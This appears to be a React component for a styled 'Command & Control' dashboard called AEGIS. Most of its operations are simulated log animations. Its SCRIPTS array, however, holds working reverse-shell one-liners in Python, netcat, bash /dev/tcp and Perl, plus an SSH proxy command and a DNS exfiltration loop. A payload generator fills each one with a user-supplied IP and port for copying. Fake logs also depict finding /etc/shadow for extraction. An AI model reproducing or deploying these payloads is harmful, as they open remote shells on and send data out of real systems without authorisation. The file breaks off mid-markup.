
import * as React from 'react';
import { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Download, Terminal as TerminalIcon, ShieldCheck, Cpu, HardDrive, Code, Zap, Globe, Lock, Share2, Monitor, Activity, Radio, RefreshCcw, Search, FileText } from 'lucide-react';

interface LogEntry {
  id: string;
  timestamp: string;
  message: string;
  type: 'INFO' | 'SUCCESS' | 'ALERT' | 'CRITICAL';
  confidence?: number;
  metadata?: string;
}

const SCRIPTS = [
  { id: 'rshell_python', name: 'Python Reverse Shell', lang: 'python', code: 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' },
  { id: 'rshell_nc', name: 'Netcat Traditional', lang: 'bash', code: 'nc -e /bin/sh {IP} {PORT}' },
  { id: 'rshell_bash', name: 'Bash TCP Uplink', lang: 'bash', code: 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1' },
  { id: 'rshell_perl', name: 'Perl Payload', lang: 'perl', code: 'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' },
  { id: 'ssh_tunnel', name: 'SSH Dynamic Proxy', lang: 'ssh', code: 'ssh -D {PORT} -N -f -p 22 root@{IP}' },
  { id: 'exfil_dns', name: 'DNS Exfiltration', lang: 'bash', code: 'for f in *; do nslookup $f.{IP}; done' }
];

interface Session {
  id: string;
  host: string;
  user: string;
  os: 'linux' | 'windows' | 'macos';
  status: 'active' | 'latent' | 'compromised';
  latency: number;
}

import { AfterActionReport } from './AfterActionReport';

export const AegisC2: React.FC = () => {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [activeOperation, setActiveOperation] = useState<string | null>(null);
  const [progress, setProgress] = useState(0);
  const [targetIp, setTargetIp] = useState('192.168.1.1');
  const [listenPort, setListenPort] = useState('4444');
  const [selectedScriptId, setSelectedScriptId] = useState(SCRIPTS[0].id);
  const [sessions, setSessions] = useState<Session[]>([
    { id: 'S-442', host: '192.168.1.42', user: 'admin', os: 'linux', status: 'active', latency: 12 },
    { id: 'S-105', host: '10.0.4.12', user: 'SYSTEM', os: 'windows', status: 'compromised', latency: 45 },
    { id: 'S-772', host: '172.16.0.5', user: 'staff', os: 'macos', status: 'latent', latency: 120 }
  ]);
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>('S-442');
  const scrollRef = useRef<HTMLDivElement>(null);

  const addLog = (message: string, type: LogEntry['type'] = 'INFO', confidence?: number, metadata?: string) => {
    const newLog: LogEntry = {
      id: Math.random().toString(36).substring(2, 9),
      timestamp: new Date().toLocaleTimeString([], { hour12: false }),
      message,
      type,
      confidence,
      metadata
    };
    setLogs(prev => [newLog, ...prev].slice(0, 100));
  };

  const runOperation = (opName: string, duration: number = 3000) => {
    if (activeOperation) return;
    setActiveOperation(opName);
    setProgress(0);
    addLog(`Initializing ${opName}...`, 'INFO');

    const start = Date.now();
    const interval = setInterval(() => {
      const elapsed = Date.now() - start;
      const currentProgress = Math.min(100, (elapsed / duration) * 100);
      setProgress(currentProgress);

      if (currentProgress >= 100) {
        clearInterval(interval);
        setActiveOperation(null);
        addLog(`${opName} completed successfully.`, 'SUCCESS');
      }
    }, 50);

    // Operation specific logs
    if (opName === 'RECON: Threaded Port Mapper') {
      setTimeout(() => addLog(`Initializing Parallel Mapper (max_workers=50)...`, 'INFO'), 300);
      setTimeout(() => addLog(`Scanning ports 1-1024 on ${targetIp}...`, 'INFO'), 800);
      setTimeout(() => addLog(`Thread-7: Found open port 22 (SSH)`, 'SUCCESS', 98), 1500);
      setTimeout(() => addLog(`Thread-24: Found open port 80 (HTTP)`, 'SUCCESS', 99), 2100);
      setTimeout(() => addLog(`Thread-42: Found open port 443 (HTTPS)`, 'SUCCESS', 99), 2800);
    } else if (opName === 'INTEL: Service Banner Grabber') {
      setTimeout(() => addLog(`Connecting to ${targetIp}:80...`, 'INFO'), 600);
      setTimeout(() => addLog(`Banner: Apache/2.4.41 (Ubuntu)`, 'ALERT', 92), 1500);
      setTimeout(() => addLog(`OS Fingerprint: Generic / Indeterminate`, 'ALERT', 42, "Signature is obfuscated or using a non-standard kernel. Signal noise indicates potential cloaking proto. High side-channel risk."), 2200);
      setTimeout(() => addLog(`INFO: Suggested deep-packet TCP stack analysis...`, 'INFO'), 2800);
    } else if (opName === 'SNIFF: Stealth Packet Analyzer') {
      setTimeout(() => addLog(`Engaging promiscuous mode...`, 'INFO'), 500);
      setTimeout(() => addLog(`Capturing raw frames on eth0...`, 'INFO'), 1000);
      setTimeout(() => addLog(`Detected ARP broadcast from 192.168.1.5`, 'INFO'), 2000);
    } else if (opName === 'DEFEND: ARP Spoof Detector') {
      setTimeout(() => addLog(`Monitoring ARP cache consistency...`, 'INFO'), 500);
      setTimeout(() => addLog(`No spoofing signatures detected.`, 'SUCCESS'), 2500);
    } else if (opName === 'DECEIVE: Active Honeypot') {
      setTimeout(() => addLog(`Deploying virtual services on ports 21, 23, 3389...`, 'INFO'), 800);
      setTimeout(() => addLog(`Honeypot active. Awaiting intrusion attempts.`, 'SUCCESS'), 2000);
    } else if (opName === 'REMOTE: Persistent Shell Uplink') {
      setTimeout(() => addLog(`Establishing encrypted tunnel to ${targetIp}...`, 'INFO'), 400);
      setTimeout(() => addLog(`Uplink Handshake: Ed25519-AES-GCM`, 'SUCCESS'), 1200);
      setTimeout(() => addLog(`Authenticated as root@${targetIp}`, 'SUCCESS', 99), 2000);
      setTimeout(() => addLog(`TTY spawned: /dev/pts/4`, 'INFO'), 2500);
      setTimeout(() => addLog(`ACCESS_GRANTED: Use terminal below for remote execution.`, 'ALERT', 100), 2800);
    } else if (opName === 'ACCESS: File System Navigator') {
      setTimeout(() => addLog(`Infiltrating VFS layer...`, 'INFO'), 500);
      setTimeout(() => addLog(`Mapping directories: /etc, /root, /var/log`, 'SUCCESS'), 1500);
      setTimeout(() => addLog(`Found sensitive target: /etc/shadow`, 'CRITICAL', 85, "Cryptographic hash detected. Ready for extraction."), 2500);
    } else if (opName === 'DEBUG: Serial Console 0x82') {
      setTimeout(() => addLog(`Connecting to UART bridge at 0x82...`, 'INFO'), 400);
      setTimeout(() => addLog(`Baud: 115200 // Data: 8-bit // Stop: 1`, 'SUCCESS'), 1200);
      setTimeout(() => addLog(`>>> 0x00 0x1A 0xFF [KERNEL_BOOT_LOG]`, 'INFO'), 2000);
      setTimeout(() => addLog(`v5.4.1-tsi: Initializing orbital subsystem...`, 'ALERT'), 2800);
      setTimeout(() => addLog(`DEBUG_CONSOLE_ATTACHED: Raw bitstream access enabled.`, 'ALERT', 100), 3500);
    }
  };

  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = 0;
    }
  }, [logs]);

  const menuItems = [
    { id: '1', name: 'RECON: Threaded Port Mapper', icon: <Search className="w-6 h-6" /> },
    { id: '2', name: 'INTEL: Service Banner Grabber', icon: <FileText className="w-6 h-6" /> },
    { id: '3', name: 'SNIFF: Stealth Packet Analyzer', icon: <Activity className="w-6 h-6" /> },
    { id: '4', name: 'CRYPTO: Secure File Encryptor', icon: <Lock className="w-6 h-6" /> },
    { id: '5', name: 'DEFEND: ARP Spoof Detector', icon: <ShieldCheck className="w-6 h-6" /> },
    { id: '6', name: 'DECEIVE: Active Honeypot', icon: <Radio className="w-6 h-6" /> },
    { id: '7', name: 'REMOTE: Persistent Shell Uplink', icon: <TerminalIcon className="w-6 h-6" /> },
    { id: '8', name: 'ACCESS: File System Navigator', icon: <HardDrive className="w-6 h-6" /> },
    { id: '9', name: 'PAYLOAD: Remote Script Generator', icon: <Code className="w-6 h-6" /> },
    { id: '10', name: 'DEBUG: Serial Console 0x82', icon: <Cpu className="w-6 h-6" /> },
  ];

  const currentScript = SCRIPTS.find(s => s.id === selectedScriptId) || SCRIPTS[0];
  const generatedCode = currentScript.code
    .replace('{IP}', targetIp)
    .replace('{PORT}', listenPort);

  return (
    <div className="space-y-8 animate-in fade-in duration-700 pb-12">
      <header className="flex items-center justify-between">
        <div>
          <h2 className="text-2xl font-black text-white uppercase tracking-tight flex items-center">
            <span className="mr-3 p-2 bg-red-500/10 rounded-lg border border-red-500/20 text-red-500">
               <TerminalIcon className="w-5 h-5" />
            </span> 
            AEGIS <span className="text-red-500 ml-2">Command & Control</span>
          </h2>
          <p className="text-[10px] text-slate-500 font-bold uppercase tracking-[0.2em] mt-1 ml-1">Unified Offensive & Defensive Operations // v1.0</p>
        </div>
        <div className="flex items-center space-x-4">
           <AfterActionReport />
           <div className={`px-3 py-1 rounded-full border text-[9px] font-black uppercase tracking-widest ${activeOperation ? 'bg-red-500/20 border-red-500 text-red-500 animate-pulse' : 'bg-slate-800 border-slate-700 text-slate-500'}`}>
             {activeOperation ? 'OP_IN_PROGRESS' : 'SYSTEM_READY'}
           </div>
        </div>
      </header>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
        <div className="lg:col-span-4 space-y-6">
          <div className="glass p-6 rounded-3xl border-slate-800 bg-slate-950/40 border-[3px] border-slate-800/50 shadow-inner group/config">
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Target Configuration</h3>
              <div className="flex space-x-1">
                 {[1,2,3].map(i => <div key={i} className="w-1.5 h-1.5 rounded-full bg-slate-800"></div>)}
              </div>
            </div>
            <div className="space-y-6">
                <div className="p-4 bg-black/40 rounded-2xl border border-slate-800 shadow-inner relative overflow-hidden group/input">
                   <div className="absolute top-0 right-0 p-2 opacity-20 pointer-events-none">
                      <div className="w-1 h-1 bg-cyan-500 rounded-full animate-ping"></div>
                   </div>
                   <div className="flex items-center justify-between mb-3 px-1">
                     <label className="text-[10px] font-black text-cyan-500/80 uppercase tracking-[0.2em]">Remote_IPv4_Staging</label>
                     <span className="text-[8px] font-mono text-slate-600 bg-slate-900 px-1.5 py-0.5 rounded border border-slate-800">SSL_ENCRYPTED</span>
                   </div>
                   <div className="flex space-x-2">
                     <div className="relative flex-grow">
                        <TerminalIcon className="absolute left-4 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-slate-600" />
                        <input 
                           type="text"
                           value={targetIp}
                           onChange={e => setTargetIp(e.target.value)}
                           className="w-full bg-[#050810] border-2 border-slate-800 rounded-xl p-3 pl-11 text-xs text-white mono outline-none focus:border-cyan-500/40 transition-all shadow-inner"
                           placeholder="e.g. 192.168.1.1"
                        />
                     </div>
                     <button 
                       onClick={() => {
                         window.dispatchEvent(new CustomEvent('nav-view', { detail: 'geolocator' }));
                       }}
                       title="Geolocate IP"
                       className="p-3 bg-slate-900 border-2 border-slate-800 rounded-xl text-slate-500 hover:text-cyan-500 hover:border-cyan-500/50 transition-all active:scale-95 shadow-lg group-hover/input:shadow-cyan-500/5"
                     >
                       <Globe className="w-4 h-4" />
                     </button>
                   </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                   <div className="p-3 bg-slate-900/40 rounded-2xl border border-slate-800/80 flex flex-col items-center justify-center space-y-1">
                      <span className="text-[7px] font-black text-slate-600 uppercase tracking-widest">Auth_Status</span>
                      <span className="text-[9px] font-black text-emerald-500 uppercase tracking-widest">Verified</span>
                   </div>
                   <div className="p-3 bg-slate-900/40 rounded-2xl border border-slate-800/80 flex flex-col items-center justify-center space-y-1">
                      <span className="text-[7px] font-black text-slate-600 uppercase tracking-widest">Proxy_Chain</span>
                      <span className="text-[9px] font-black text-amber-500 uppercase tracking-widest">Active (3)</span>
                   </div>
                </div>
            </div>
          </div>

          <div className="glass p-6 rounded-3xl border-slate-800 bg-slate-950/40 border-[3px] border-slate-800/50 shadow-inner">
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Operations Menu</h3>
              <Zap className="w-3 h-3 text-red-500 animate-pulse" />
            </div>
            <div className="grid grid-cols-2 gap-3">
               {menuItems.map(item => (
                 <button 
                   key={item.id}
                   onClick={() => runOperation(item.name)}
                   disabled={!!activeOperation}
                   className="group flex flex-col items-center justify-center space-y-3 p-5 bg-slate-900/40 hover:bg-red-500/10 border-2 border-slate-800/60 hover:border-red-500/50 rounded-3xl transition-all disabled:opacity-20 active:scale-95 shadow-xl shadow-black/40"
                 >
                   <div className="text-red-500/80 group-hover:text-red-400 group-hover:scale-110 transition-all drop-shadow-[0_0_8px_rgba(239,68,68,0.3)]">
                      {item.icon}
                   </div>
                   <span className="text-[8px] font-black text-slate-500 group-hover:text-white uppercase tracking-widest text-center leading-tight">{item.name.split(': ')[1].replace(' ', '\n')}</span>
                 </button>
               ))}
            </div>
          </div>
        </div>

        <div className="lg:col-span-8 space-y-6">
           <div className="glass p-6 rounded-3xl border-slate-800 bg-slate-950/40 min-h-[500px] flex flex-col">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center space-x-4">
                   <button 
                     onClick={() => {
                        if (logs.length === 0) return;
                        const data = logs.map(l => `[${l.timestamp}] [${l.type}] ${l.message}`).join('\n');
                        const blob = new Blob([data], { type: 'text/plain' });
                        const url = URL.createObjectURL(blob);
                        const link = document.createElement('a');
                        link.href = url;
                        link.download = `AEGIS_OP_LOG_${new Date().getTime()}.txt`;
                        link.click();
                        URL.revokeObjectURL(url);
                     }}
                     disabled={logs.length === 0}
                     className="flex items-center space-x-1.5 px-3 py-1 bg-slate-800 hover:bg-slate-700 border border-slate-700 rounded-lg text-[9px] font-black text-red-500 uppercase tracking-widest transition-all disabled:opacity-20"
                   >
                     <Download className="w-3 h-3" />
                     <span>Export_Log</span>
                   </button>
                   <div className="h-4 w-px bg-slate-800" />
                   <h3 className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Operation Output Terminal</h3>
                </div>
                {activeOperation && (
                  <div className="flex items-center space-x-4">
                    <span className="text-[9px] text-red-500 font-black uppercase tracking-widest">{progress.toFixed(0)}%</span>
                    <div className="w-32 h-1.5 bg-slate-900 rounded-full overflow-hidden border border-slate-800">
                       <motion.div 
                         className="h-full bg-red-500"
                         initial={{ width: 0 }}
                         animate={{ width: `${progress}%` }}
                       />
                    </div>
                  </div>
                )}
              </div>
              
              <div className="flex-grow bg-slate-950/50 rounded-2xl border border-slate-900 p-6 overflow-hidden flex flex-col">
                 <div ref={scrollRef} className="flex-grow overflow-y-auto scrollbar-hide space-y-2">
                    <AnimatePresence initial={false}>
                       {logs.map((log) => (
                         <motion.div 
                           key={log.id}
                           initial={{ opacity: 0, y: 10 }}
                           animate={{ opacity: 1, y: 0 }}
                           className="flex items-start space-x-3 text-[11px] mono leading-relaxed"
                         >
                            <span className="text-slate-600 shrink-0">[{log.timestamp}]</span>
                            <div className="flex flex-col flex-grow">
                               <div className="flex items-start justify-between w-full">
                                  <span className={`
                                    ${log.type === 'SUCCESS' ? 'text-green-500' : ''}
                                    ${log.type === 'ALERT' ? 'text-amber-500' : ''}
                                    ${log.type === 'CRITICAL' ? 'text-red-500 font-black' : ''}
                                    ${log.type === 'INFO' ? 'text-slate-400' : ''}
                                  `}>
                                    {log.type === 'SUCCESS' ? '✓ ' : ''}
                                    {log.type === 'ALERT' ? '⚠️ ' : ''}
                                    {log.type === 'CRITICAL' ? '🔥 ' : ''}
                                    {log.message}
                                  </span>
                                  {log.confidence !== undefined && (
                                    <span className={`text-[8px] font-black px-1.5 py-0.5 rounded border ml-2 ${
                                      log.confidence > 80 ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-500' : 
                                      log.confidence > 50 ? 'bg-amber-500/10 border-amber-500/30 text-amber-500' :
                                      'bg-red-500/10 border-red-500/30 text-red-500'
                                    }`}>
                                      CONF:{log.confidence}%
                                    </span>
                                  )}
                               </div>
                               {log.metadata && (
                                 <motion.p 
                                   initial={{ opacity: 0 }}
                                   animate={{ opacity: 1 }}
                                   className="text-[9px] text-slate-500 mt-1 italic leading-tight pl-4 border-l border-slate-800"
                                 >
                                   {log.metadata}
                                 </motion.p>
                               )}
                            </div>
                         </motion.div>
                       ))}
                    </AnimatePresence>
                    {logs.length === 0 && (
                      <div className="h-full flex flex-col items-center justify-center opacity-20 py-20">
                         <p className="text-[10px] font-black uppercase tracking-[0.4em]">Awaiting Command Input</p>
                      </div>
                    )}
                 </div>
              </div>

              <div className="mt-6 grid grid-cols-2 lg:grid-cols-4 gap-4">
                 <div className="bg-slate-900/60 backdrop-blur-md p-4 rounded-2xl border border-slate-800/80 shadow-inner group">
                    <div className="flex items-center justify-between mb-1">
                       <p className="text-[7px] text-slate-500 font-bold uppercase tracking-widest">CPU_UTILIZATION</p>
                       <div className="w-2 h-2 rounded-full bg-cyan-500 shadow-[0_0_8px_rgba(6,182,212,0.5)]"></div>
                    </div>
                    <p className="text-xl font-black text-white font-mono leading-none">12.4<span className="text-[10px] text-slate-600">%</span></p>
                    <div className="mt-2 h-1 w-full bg-slate-950 rounded-full overflow-hidden flex">
                       <div className="h-full bg-cyan-500" style={{ width: '40%' }}></div>
                       <div className="h-full bg-slate-800" style={{ width: '60%' }}></div>
                    </div>
                 </div>
                 <div className="bg-slate-900/60 backdrop-blur-md p-4 rounded-2xl border border-slate-800/80 shadow-inner group">
                    <div className="flex items-center justify-between mb-1">
                       <p className="text-[7px] text-slate-500 font-bold uppercase tracking-widest">ACTIVE_INSTANCES</p>
                       <Activity className="w-2.5 h-2.5 text-emerald-500" />
                    </div>
                    <p className="text-xl font-black text-white font-mono leading-none">{sessions.length * 14 + 42}</p>
                    <div className="mt-2 flex space-x-1">
                       {[1,2,3,4,5,6,7,8].map(i => <div key={i} className={`h-1 flex-grow rounded-full ${i <= 3 ? 'bg-emerald-500' : 'bg-slate-800'}`}></div>)}
                    </div>
                 </div>
                 <div className="bg-slate-900/60 backdrop-blur-md p-4 rounded-2xl border border-slate-800/80 shadow-inner group">
                    <div className="flex items-center justify-between mb-1">
                       <p className="text-[7px] text-slate-500 font-bold uppercase tracking-widest">UPLINK_LATENCY</p>
                       <Globe className="w-2.5 h-2.5 text-amber-500" />
                    </div>
                    <p className="text-xl font-black text-amber-500 font-mono leading-none">{sessions.find(s => s.id === selectedSessionId)?.latency || 14}<span className="text-[10px] text-slate-600">ms</span></p>
                    <div className="mt-2 h-1 w-full flex space-x-0.5">
                       {Array.from({ length: 12 }).map((_, i) => (
                          <div key={i} className={`h-full flex-grow rounded-sm ${i < 8 ? 'bg-amber-500/60' : 'bg-slate-800'}`}></div>
                       ))}
                    </div>
                 </div>
                 <div className="bg-slate-900/60 backdrop-blur-md p-4 rounded-2xl border border-slate-800/80 shadow-inner group">
                    <div className="flex items-center justify-between mb-1">
                       <p className="text-[7px] text-slate-500 font-bold uppercase tracking-widest">SEC_THREAT_LEVEL</p>
                       <ShieldCheck className="w-2.5 h-2.5 text-red-500" />
                    </div>
                    <p className="text-xl font-black text-red-500 font-mono leading-none">LOW</p>
                    <div className="mt-2 h-1 w-full bg-slate-950 rounded-full overflow-hidden">
                       <div className="h-full bg-red-500" style={{ width: '15%' }}></div>
                    </div>
                 </div>
              </div>
           </div>

           {/* Payload Generator & Script Library */}
           <div className="mt-8 grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="glass p-6 rounded-3xl border-slate-800 bg-slate-900/40">
                 <div className="flex items-center space-x-2 mb-4">
                    <Code className="w-4 h-4 text-cyan-500" />
                    <h4 className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Payload Repository</h4>
                 </div>
                 <div className="space-y-2 max-h-[220px] overflow-y-auto scrollbar-hide pr-1">
                    {SCRIPTS.map(script => (
                       <button 
                          key={script.id}
                          onClick={() => setSelectedScriptId(script.id)}
                          className={`w-full flex items-center justify-between p-3 rounded-xl border text-left transition-all ${selectedScriptId === script.id ? 'bg-cyan-500/10 border-cyan-500/40' : 'bg-slate-950/40 border-slate-800/60 hover:border-slate-700'}`}
                       >
                          <div className="flex flex-col">
                             <span className="text-[10px] font-black text-white uppercase">{script.name}</span>
                             <span className="text-[8px] text-slate-500 font-mono italic">{script.lang}</span>
                          </div>
                          <div className={`w-1.5 h-1.5 rounded-full ${selectedScriptId === script.id ? 'bg-cyan-500 shadow-[0_0_8px_rgba(6,182,212,0.5)]' : 'bg-slate-800'}`}></div>
                       </button>
                    ))}
                 </div>
                 <div className="mt-4 pt-4 border-t border-slate-800/50">
                    <div className="flex items-center justify-between mb-3 px-1">
                       <span className="text-[8px] font-black text-slate-600 uppercase">Listener_Config</span>
                    </div>
                    <div className="flex items-center space-x-2">
                       <div className="flex-grow bg-slate-950 rounded-lg border border-slate-800 px-3 py-1.5 flex items-center">
                          <span className="text-[9px] font-mono text-slate-500 mr-2 uppercase">Port:</span>
                          <input 
                             type="text"
                             value={listenPort}
                             onChange={e => setListenPort(e.target.value)}
                             className="bg-transparent border-none outline-none text-[10px] font-mono text-cyan-400 w-full"
                          />
                       </div>
                       <button className="p-2 bg-slate-950 border border-slate-800 rounded-lg text-slate-400 hover:text-white transition-colors">
                          <Share2 className="w-3.5 h-3.5" />
                       </button>
                    </div>
                 </div>
              </div>

              <div className="glass p-6 rounded-3xl border-slate-800 bg-slate-900/40 flex flex-col">
                 <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center space-x-2">
                       <Zap className="w-4 h-4 text-emerald-500" />
                       <h4 className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Active Toolscript</h4>
                    </div>
                    <button 
                       onClick={() => {
                          navigator.clipboard.writeText(generatedCode);
                          addLog(`Script copied to clipboard: ${currentScript.name}`, 'SUCCESS');
                       }}
                       className="text-[8px] font-black text-emerald-500 hover:text-emerald-400 uppercase flex items-center space-x-1"
                    >
                       <span>COPY_UPLINK</span>
                    </button>
                 </div>
                 <div className="flex-grow bg-black/60 rounded-2xl border border-slate-800/60 p-4 font-mono text-[9px] text-emerald-500/80 break-all leading-relaxed relative group overflow-hidden">
                    <div className="absolute top-2 right-2 flex space-x-1 opacity-0 group-hover:opacity-100 transition-opacity">
                       <div className="w-1.5 h-1.5 rounded-full bg-slate-800"></div>
                       <div className="w-1.5 h-1.5 rounded-full bg-slate-800"></div>
                       <div className="w-1.5 h-1.5 rounded-full bg-slate-800"></div>
                    </div>
                    <pre className="whitespace-pre-wrap">{generatedCode}</pre>
                    <div className="absolute inset-0 pointer-events-none bg-gradient-to-t from-black/40 to-transparent"></div>
                 </div>
                 <button 
                    onClick={() => {
                       runOperation(`DEPLOY: ${currentScript.name}`, 4000);
                       setTimeout(() => addLog(`Pushing payload to remote staging area...`, 'INFO'), 600);
                       setTimeout(() => addLog(`Executing ${currentScript.lang} vector...`, 'INFO'), 1800);
                       setTimeout(() => addLog(`Uplink established. Terminal redirected.`, 'SUCCESS', 100), 3800);
                    }}
                    disabled={!!activeOperation}
                    className="mt-4 w-full py-2.5 bg-emerald-600/20 border border-emerald-500/40 rounded-xl text-[10px] font-black text-emerald-500 uppercase hover:bg-emerald-600/30 transition-all active:scale-95 disabled:opacity-30 flex items-center justify-center space-x-2"
                 >
                    <Globe className="w-3.5 h-3.5" />
                    <span>Execute_Remote_Uplink</span>
                 </button>
              </div>
           </div>
              <div className="mt-8 glass p-6 rounded-3xl border-slate-800 bg-slate-950/40">
                 <div className="flex items-center justify-between mb-6">
                    <div className="flex items-center space-x-3">
                       <Radio className="w-4 h-4 text-cyan-500" />
                       <h3 className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Active Remote Sessions</h3>
                    </div>
                    <button 
                       onClick={() => addLog('Refreshing session list...', 'INFO')}
                       className="p-2 bg-slate-900 border border-slate-800 rounded-lg text-slate-500 hover:text-cyan-500 transition-all"
                    >
                       <RefreshCcw className="w-3.5 h-3.5" />
                    </button>
                 </div>
                 <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                    {sessions.map((session, index) => (
                       <motion.button 
                          key={session.id}
                          initial={{ opacity: 0, x: -20 }}
                          animate={{ opacity: 1, x: 0 }}
                          transition={{ delay: index * 0.1 }}
                          onClick={() => setSelectedSessionId(session.id)}
                          className={`p-5 rounded-3xl border transition-all text-left relative overflow-hidden group ${selectedSessionId === session.id ? 'bg-cyan-500/10 border-cyan-500/40 shadow-[0_0_20px_rgba(6,182,212,0.1)]' : 'bg-slate-900/40 border-slate-800/80 hover:border-slate-600'}`}
                       >
                          {selectedSessionId === session.id && (
                             <motion.div 
                                layoutId="sessionHighlight"
                                className="absolute inset-0 bg-gradient-to-br from-cyan-500/5 to-transparent pointer-events-none" 
                             />
                          )}
                          <div className="flex justify-between items-start mb-4 relative z-10">
                             <div className="flex items-center space-x-3">
                                <div className={`w-10 h-10 rounded-2xl flex items-center justify-center text-xl shadow-inner ${
                                   session.os === 'linux' ? 'bg-slate-800 text-white' : 
                                   session.os === 'windows' ? 'bg-blue-600/20 text-blue-400' : 
                                   'bg-slate-700 text-white'
                                }`}>
                                   {session.os === 'linux' ? '🐧' : session.os === 'windows' ? '🪟' : '🍎'}
                                </div>
                                <div className="flex flex-col">
                                   <span className="text-[12px] font-black text-white uppercase tracking-tight">{session.id}</span>
                                   <span className="text-[8px] font-black text-slate-500 uppercase tracking-widest">Socket_Open</span>
                                </div>
                             </div>
                             <div className={`px-2 py-0.5 rounded-lg text-[8px] font-black uppercase tracking-tighter shadow-sm border ${
                                session.status === 'active' ? 'bg-green-500/10 text-green-500 border-green-500/20' :
                                session.status === 'compromised' ? 'bg-red-500/10 text-red-500 border-red-500/20 animate-pulse' :
                                'bg-amber-500/10 text-amber-500 border-amber-500/20'
                             }`}>
                                {session.status}
                             </div>
                          </div>
                          <div className="space-y-1.5 relative z-10">
                             <div className="flex items-center space-x-2">
                                <div className="w-1 h-1 rounded-full bg-slate-700"></div>
                                <p className="text-[11px] font-mono text-slate-300">{session.host}</p>
                             </div>
                             <div className="flex items-center space-x-2">
                                <div className="w-1 h-1 rounded-full bg-slate-700"></div>
                                <p className="text-[10px] font-bold text-slate-500 uppercase tracking-widest">User: <span className="text-cyan-500/80">{session.user}</span></p>
                             </div>
                          </div>
                          <div className="mt-4 pt-4 border-t border-slate-800/50 flex items-center justify-between text-[9px] font-mono relative z-10">
                             <div className="flex items-center space-x-2">
                                <div className={`w-1.5 h-1.5 rounded-full ${session.latency < 50 ? 'bg-green-500' : 'bg-amber-500'} shadow-[0_0_8px_currentColor]`}></div>
                                <span className="text-slate-500 italic">{session.latency}ms RTT</span>
                             </div>
                             <span className="text-cyan-500/80 group-hover:text-cyan-400 transition-colors font-black uppercase tracking-widest">Access _&gt;</span>
                          </div>
                       </motion.button>
                    ))}
                 </div>
              </div>

              {/* Advanced Desktop Simulator & Terminal */}
              <div className="mt-8 grid grid-cols-1 lg:grid-cols-12 gap-8">
                 {/* Remote Desktop Viewer */}
                 <div className="lg:col-span-12 xl:col-span-8 glass p-6 rounded-3xl border-slate-800 bg-slate-950/40 overflow-hidden relative group">
                    <div className="flex items-center justify-between mb-6">
                       <div className="flex items-center space-x-3 text-cyan-500">
                          <Monitor className="w-4 h-4" />
                          <h4 className="text-[10px] font-black text-white uppercase tracking-widest tracking-widest">VNC Mirror: {sessions.find(s => s.id === selectedSessionId)?.host || 'DISCONNECTED'}</h4>
                       </div>
                       <div className="flex space-x-2">
                          <div className="px-2 py-0.5 bg-slate-900 border border-slate-800 rounded font-mono text-[8px] text-slate-500 uppercase">1080p // 15FPS</div>
                          <div className="px-2 py-0.5 bg-red-500/20 border border-red-500/40 rounded font-mono text-[8px] text-red-500 uppercase font-black">RECORDING</div>
                       </div>
                    </div>
                    
                    <div className="aspect-video bg-[#0c0e14] rounded-2xl border-4 border-slate-800 p-1 shadow-[0_0_50px_rgba(0,0,0,0.5)] relative overflow-hidden cursor-crosshair group-hover:border-slate-700 transition-colors">
                       <div className="absolute inset-0 z-30 pointer-events-none border border-white/5 rounded-xl"></div>
                       <div className="absolute top-4 left-4 z-40 bg-black/60 backdrop-blur-md px-3 py-1.5 rounded-lg border border-white/10 flex items-center space-x-3 scale-90 origin-top-left transition-transform group-hover:scale-100">
                          <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse"></div>
                          <span className="text-[9px] font-black text-white uppercase tracking-widest">Stream_Encrypted_AES256</span>
                       </div>
                       <div className="w-full h-full bg-[#020617] flex flex-col relative overflow-hidden">
                          {/* Grain & Noise Overlay */}
                          <div className="absolute inset-0 opacity-[0.03] pointer-events-none noise-bg"></div>
                          
                          {/* Desktop Wallpaper Blur */}
                          <div className="absolute inset-0 bg-[radial-gradient(circle_at_20%_20%,rgba(30,27,75,0.4)_0%,transparent 100%)]"></div>
                          
                          {/* Window Grid */}
                          <div className="p-6 grid grid-cols-6 lg:grid-cols-4 xl:grid-cols-6 gap-6 z-10">
                             {[
                                { icon: '📁', name: 'documents', color: 'text-amber-500' },
                                { icon: '⚙️', name: 'sys_config', color: 'text-slate-400' },
                                { icon: '💼', name: 'private_keys', color: 'text-emerald-500' },
                                { icon: '🐍', name: 'dev_tools', color: 'text-blue-500' },
                                { icon: '🔐', name: 'vault_access', color: 'text-red-500' },
                                { icon: '🌐', name: 'web_cache', color: 'text-cyan-500' }
                             ].map((icon, i) => (
                                <motion.div 
                                   key={i}
                                   initial={{ opacity: 0, y: 10 }}
                                   animate={{ opacity: 1, y: 0 }}
                                   transition={{ delay: 1 + (i * 0.1) }}
                                   className="flex flex-col items-center space-y-2 p-3 rounded-2xl hover:bg-white/5 transition-all group/icon cursor-default"
                                >
                                   <div className="text-3xl drop-shadow-[0_0_15px_rgba(255,255,255,0.1)] group-hover/icon:scale-110 transition-transform">{icon.icon}</div>
